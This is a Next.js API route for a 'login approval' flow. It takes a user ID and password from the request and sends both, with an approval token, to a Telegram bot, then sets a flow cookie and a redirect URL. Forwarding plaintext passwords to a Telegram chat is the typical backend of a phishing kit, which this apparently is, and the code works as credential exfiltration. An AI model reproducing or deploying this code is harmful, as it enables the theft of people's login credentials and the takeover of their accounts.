import { NextRequest, NextResponse } from "next/server"
import { createApprovalState } from "@/lib/approval-state"
import { LOGIN_REDIRECT_URL } from "@/lib/project-config"
import { sendTelegramApprovalRequest } from "@/lib/telegram"

const FLOW_MAX_AGE_SEC = 10 * 60

export async function POST(request: NextRequest) {
  try {
    const data = await request.json()
    const userId = String(data?.userId ?? "").trim()
    const password = String(data?.password ?? "")
    if (!userId) {
      return NextResponse.json({ error: "userId is required" }, { status: 400 })
    }

    const approval = await createApprovalState({
      userId,
      redirectUrl: LOGIN_REDIRECT_URL,
      metadata: { flow: "login" },
    })
    const sent = await sendTelegramApprovalRequest({
      token: approval.token,
      userId,
      password,
    })
    if (!sent) {
      return NextResponse.json({ error: "Failed to send approval request" }, { status: 502 })
    }

    const response = NextResponse.json({
      success: true,
      token: approval.token,
      status: approval.status,
      expiresAt: approval.expiresAt,
    })
    response.cookies.set("login_flow", "1", {
      path: "/",
      maxAge: FLOW_MAX_AGE_SEC,
      sameSite: "lax",
    })
    return response
  } catch (error) {
    console.error("Error creating login approval:", error)
    return NextResponse.json({ error: "Failed to create approval request" }, { status: 500 })
  }
}
